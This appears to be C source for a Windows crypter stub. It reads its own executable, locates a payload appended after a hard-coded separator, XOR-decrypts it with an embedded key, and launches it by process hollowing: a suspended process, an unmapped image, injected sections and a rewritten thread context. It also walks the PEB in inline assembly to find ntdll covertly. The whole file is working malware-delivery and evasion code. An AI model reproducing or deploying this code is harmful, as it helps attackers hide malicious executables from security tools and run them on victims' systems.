#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <wchar.h>
#include "Binary.h"

#define STUB_DEFAULT_KEY "oUf!rOsj6x*FgyNjBuTuW#R0jZSOg!kD1D8ZYc$YDZbgiXaoxVS@xCOW%y%sdVES"
#define STUB_DEFAULT_SEPARATOR "mxE98lDhF6mGxJd6"

//kernel 0x76dd0000
DWORD GetAddress32(int entry)
{
	DWORD kernelAddr = 0;

	__asm
	{
		mov ebx, fs: [0x30]		// Get PEB
		mov ebx, [ebx + 0xC]	// Get PEB->Ldr
		mov ebx, [ebx + 0x14]	// Get 1st Entry
	}

	while (entry--) {
		__asm
		{
			mov ebx, [ebx]
		}
	}

	__asm
	{
		mov ebx, [ebx + 0x10]	// Get the entry's base address
		mov kernelAddr, ebx
	}

	
	return kernelAddr;
}


HANDLE ExecuteFile(LPSTR szFilePath, LPVOID pFile)
{
	HANDLE np = (HANDLE)NULL;
	typedef LONG(WINAPI* NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
	typedef BOOL(WINAPI* NtSetThreadContext)(HANDLE hThread, PCONTEXT lpContext);

	HMODULE m_hmNtdll = (HMODULE)GetAddress32(1);
	//HMODULE m_hmKernel = (HMODULE)GetAddress32(2);

	PIMAGE_DOS_HEADER IDH;
	PIMAGE_NT_HEADERS INH;
	PIMAGE_SECTION_HEADER ISH;
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	PCONTEXT CTX;
	PDWORD dwImageBase;

	NtUnmapViewOfSection xNtUnmapViewOfSection;
	NtSetThreadContext xNtSetThreadContext;

	LPVOID pImageBase;
	int Count;
	IDH = (PIMAGE_DOS_HEADER)(pFile);

	if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
	{
		INH = (PIMAGE_NT_HEADERS)((DWORD)(pFile) + IDH->e_lfanew);
		if (INH->Signature == IMAGE_NT_SIGNATURE)
		{
			RtlZeroMemory(&SI, sizeof(SI));
			RtlZeroMemory(&PI, sizeof(PI));

			if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
			{
				CTX = (PCONTEXT)(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
				CTX->ContextFlags = CONTEXT_FULL;
				if (GetThreadContext(PI.hThread, (LPCONTEXT)(CTX)))
				{
					ReadProcessMemory(PI.hProcess, (LPCVOID)(CTX->Ebx + 8), (LPVOID)(&dwImageBase), 4, NULL);

					if ((DWORD)(dwImageBase) == INH->OptionalHeader.ImageBase)
					{
						xNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(m_hmNtdll, "NtUnmapViewOfSection"));
						xNtUnmapViewOfSection(PI.hProcess, (PVOID)(dwImageBase));
					}

					pImageBase = VirtualAllocEx(PI.hProcess, (LPVOID)(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);



					if (pImageBase)
					{
						WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
						for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++)
						{
							ISH = (PIMAGE_SECTION_HEADER)((DWORD)(pFile) + IDH->e_lfanew + 248 + (Count * 40));
							WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)(pImageBase) + ISH->VirtualAddress), (LPVOID)((DWORD)(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
						}
						WriteProcessMemory(PI.hProcess, (LPVOID)(CTX->Ebx + 8), (LPVOID)(&INH->OptionalHeader.ImageBase), 4, NULL);
						CTX->Eax = (DWORD)(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;

						xNtSetThreadContext = (NtSetThreadContext)(GetProcAddress(m_hmNtdll, "NtSetContextThread"));
						xNtSetThreadContext(PI.hThread, (LPCONTEXT)(CTX));
						np = PI.hThread;
						
					}
				}

				//while (!GetThreadPriority(PI.hThread)) {
					ResumeThread(PI.hThread);
				//}
			}
		}
	}
	VirtualFree(pFile, 0, MEM_RELEASE);
	return np;
}

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	PSTR lpCmdLine, INT nCmdShow)
{
	//AllocConsole();
	//freopen(("CONOUT$"), ("w"), stdout);
	const char* m_sKey = STUB_DEFAULT_KEY;
	const char* m_sSeparator = STUB_DEFAULT_SEPARATOR;

	//printf("key: %s\nsize: %d\n", m_sKey, strlen(m_sKey));
	//printf("separator: %s\nsize: %d\n", m_sSeparator, strlen(m_sSeparator));

	char szExeFileName[MAX_PATH];
	GetModuleFileNameA(NULL, szExeFileName, MAX_PATH);

	

	char* m_sStub;
	int m_iStubSize = ReadBinaryFile(szExeFileName, &m_sStub);
	//printf("Stub size: %d\n", m_iStubSize);

	int m_iSepPosEnd = FindStringInBinaryFile(m_sStub, m_iStubSize, m_sSeparator, strlen(m_sSeparator), 1) + strlen(m_sSeparator);
	int m_iExecSize = (m_iStubSize - m_iSepPosEnd);
	//printf("Separator position end: %d\n", m_iSepPosEnd);
	//printf("Exec size: %d\n", m_iExecSize);

	if (m_iSepPosEnd != strlen(m_sSeparator)){//(m_iStubSize - m_iSepPosEnd != m_iExecSize) {

		char* m_sExec = (char*)malloc(m_iExecSize * sizeof(char));
		for (int i = m_iSepPosEnd; i < m_iStubSize; i++)
		{
			*(m_sExec + (i - m_iSepPosEnd)) = *(m_sStub + i);
		}

		XORBinary(m_sExec, m_iExecSize, m_sKey, strlen(m_sKey));

		ExecuteFile(szExeFileName, m_sExec);
		free(m_sExec);
	}

	
	free(m_sStub);

	/*MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		if (msg.message == WM_QUIT)
			break;

		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}*/
	//FreeConsole();
	return 0;
}